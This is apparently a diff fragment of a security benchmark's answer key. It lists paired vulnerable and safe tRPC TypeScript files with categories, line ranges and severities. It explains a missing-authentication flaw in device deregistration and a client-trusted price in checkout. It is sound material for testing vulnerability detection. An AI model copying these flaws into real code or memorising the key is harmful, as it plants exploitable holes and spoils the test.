+      "kind": "safe",
+      "pairedWith": "trpc-revenue-breakdown-filter",
+      "why": "The same $queryRawUnsafe breakdown, but the optional filter is pushed onto the values array and referenced as a positional placeholder, and the only interpolated fragment is a column name resolved through a fixed map, so no caller-supplied text becomes statement text."
+    },
+    {
+      "id": "trpc-device-deregistration",
+      "family": "trpc",
+      "architecture": "tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path",
+      "language": "typescript",
+      "file": "trpc/devices-router.ts",
+      "kind": "vulnerable",
+      "category": "missing_authentication",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "devices.deregister",
+      "line": 42,
+      "lineRange": [
+        42,
+        56
+      ],
+      "runtimeVerifiable": true,
+      "why": "deregister is declared on publicProcedure while every sibling in the router is protectedProcedure, so an unauthenticated caller with a device id revokes that device's push token, deletes the row and clears its refresh tokens — signing a stranger's handset out. The Zod input is present and correct; validating that the id is a UUID says nothing about who is allowed to submit it. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path."
+    },
+    {
+      "id": "trpc-session-revocation",
+      "family": "trpc",
+      "language": "typescript",
+      "file": "trpc/sessions-router.ts",
+      "kind": "safe",
+      "pairedWith": "trpc-device-deregistration",
+      "why": "The same sign-out mutation, including the same push-token revocation and refresh-token cleanup, but it runs on protectedProcedure and the row is loaded with ctx.session.userId in the where clause, so a caller can only revoke their own sessions."
+    },
+    {
+      "id": "trpc-cart-order-submission",
+      "family": "trpc",
+      "architecture": "tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path",
+      "language": "typescript",
+      "file": "trpc/checkout-router.ts",
+      "kind": "vulnerable",
+      "category": "business_logic_price_manipulation",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "checkout.placeOrder",
+      "line": 46,
+      "lineRange": [
+        45,
+        53
+      ],
+      "runtimeVerifiable": true,
+      "why": "The subtotal is summed from the client-supplied unitPriceCents, and that subtotal becomes the order total and the amount handed to ctx.payments.charge. The catalog rows are already loaded a few lines above and carry the authoritative priceCents, but they are only consulted for availability, so a caller can post unitPriceCents: 1 and be charged a penny. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path."
+    },
+    {
+      "id": "trpc-plan-change-submission",
+      "family": "trpc",
+      "language": "typescript",
+      "file": "trpc/subscription-checkout.ts",
+      "kind": "safe",
+      "pairedWith": "trpc-cart-order-submission",
+      "why": "The input still carries the price the browser was showing, but the total is summed from the catalog's priceCents and the submitted figure is only compared against it so a stale basket is rejected with CONFLICT, so the charged amount is server-determined."
+    }
+  ]
+}
